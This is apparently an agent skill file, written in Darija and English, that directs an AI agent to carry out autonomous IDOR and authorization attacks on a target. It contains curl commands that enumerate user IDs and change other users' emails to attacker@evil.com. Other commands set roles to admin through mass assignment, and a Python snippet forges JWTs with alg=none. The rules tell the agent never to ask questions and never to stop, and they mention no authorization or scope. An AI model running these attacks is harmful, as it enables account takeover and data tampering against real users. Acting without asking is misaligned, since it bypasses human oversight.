---
name: e5tira9-idor
description: "IDOR & authorization testing otomatique — auto-discover, privilege escalation, horizontal/vertical access control. Phase rabe3a fel e5tira9. Darija."
---

# E5tira9 IDOR — Authorization Testing Autonome

Skill mte3 IDOR & authorization testing. Bech tlawej 3la cross-user access, privilege escalation, role bypass.

## Qawa3d

1. MATSE2EL CHI HAJA
2. Kol action → `[FEED] HH:MM:SS | IDOR | <action> | <result>`
3. Testi KOL endpoints m3a KOL roles
4. MAT9AFCH 7atta tlawej 3la kol Hajja

## Workflow

### Step 1: Create Auth Session
```
shannon_auth_session action="create" target="<target>" auth_type="jwt" credentials='{"email":"user@target","password":"user123"}'
[FEED] 17:00:00 | IDOR | session created | user token obtained
```

### Step 2: Auto IDOR Discovery
```
shannon_idor_test target="<target>" mode="auto" auth_token="<token>" base_url="<target>/api"
[FEED] 17:05:00 | IDOR | auto discovery | 17 patterns tested, 5 vulnerable
```

### Step 3: Manual IDOR Testing
```
# Test sequential IDs
shannon_exec command='for i in 1 2 3 4 5 10 20 50 100; do code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer <token>" "<target>/api/users/$i"); echo "user/$i: $code"; done'

# Test UUIDs (if known)
shannon_exec command='curl -sk -H "Authorization: Bearer <token>" "<target>/api/users/<other-user-uuid>"'

# Test order/invoice endpoints
shannon_exec command='for i in 1 2 3 4 5; do curl -sk -H "Authorization: Bearer <token>" "<target>/api/orders/$i"; done'

# Test admin endpoints
shannon_exec command='curl -sk -H "Authorization: Bearer <token>" "<target>/api/admin/users"'
shannon_exec command='curl -sk -H "Authorization: Bearer <token>" "<target>/api/admin/settings"'
[FEED] 17:10:00 | IDOR | manual testing | /api/users/2 returns other user data
```

### Step 4: Horizontal Privilege Escalation
```
# Access other user's resources
shannon_exec command='curl -sk -H "Authorization: Bearer <token>" "<target>/api/users/1/profile"'
shannon_exec command='curl -sk -H "Authorization: Bearer <token>" "<target>/api/users/2/profile"'
shannon_exec command='curl -sk -H "Authorization: Bearer <token>" "<target>/api/account/1/settings"'

# Modify other user's data
shannon_exec command='curl -sk -X PUT -H "Authorization: Bearer <token>" "<target>/api/users/2/profile" -d "{\"email\":\"attacker@evil.com\"}"'
[FEED] 17:15:00 | IDOR | horizontal escalation | can read + modify other users
```

### Step 5: Vertical Privilege Escalation
```
# Role manipulation
shannon_exec command='curl -sk -X PUT -H "Authorization: Bearer <token>" "<target>/api/users/1" -d "{\"role\":\"admin\"}"'
shannon_exec command='curl -sk -X PUT -H "Authorization: Bearer <token>" "<target>/api/profile" -d "{\"isAdmin\":true}"'
shannon_exec command='curl -sk -X PUT -H "Authorization: Bearer <token>" "<target>/api/profile" -d "{\"permissions\":[\"admin\",\"read\",\"write\",\"delete\"]}"'

# Admin endpoint access
shannon_exec command='curl -sk -H "Authorization: Bearer <token>" "<target>/admin"'
shannon_exec command='curl -sk -H "Authorization: Bearer <token>" "<target>/api/admin/config"'
[FEED] 17:20:00 | IDOR | vertical escalation | role changed to admin
```

### Step 6: Mass Assignment
```
shannon_exec command='curl -sk -X POST "<target>/api/register" -H "Authorization: Bearer <token>" -d "{\"email\":\"test@test.com\",\"password\":\"test\",\"role\":\"admin\"}"'
shannon_exec command='curl -sk -X PUT "<target>/api/profile" -H "Authorization: Bearer <token>" -d "{\"name\":\"test\",\"is_admin\":true,\"verified\":true}"'
[FEED] 17:25:00 | IDOR | mass assignment | role=admin accepted in registration
```

### Step 7: Session Token Analysis
```
# JWT analysis
shannon_exec command='echo "<jwt>" | base64 -d'
shannon_exec command='python3 -c "import jwt; print(jwt.decode(\"<jwt>\", verify=False))"'

# Token tampering
shannon_exec command='python3 -c "
import jwt
token = jwt.encode({\"user_id\":1,\"role\":\"admin\",\"exp\":9999999999}, \"\", algorithm=\"none\")
print(token)
"'
[FEED] 17:30:00 | IDOR | JWT analysis | alg=none accepted, admin token forged
```

## Loota ma tlqot chi Hajja

- Jarrab UUID enumeration
- Jarrab email enumeration: /api/users?email=admin@target
- Jarrab path traversal 3la user IDs
- Testi m3a cookies mokhtelfin
- Jarrab API key reuse
- Testi m3a roles mokhtelfin: user, manager, admin, superadmin
- Testi bulk endpoints: /api/users/batch
- Jarrab export endpoints: /api/users/export
- Testi m3a HTTP methods: GET → PUT → DELETE

MAT9AFCH — e5tira9 mch 5 dolar.
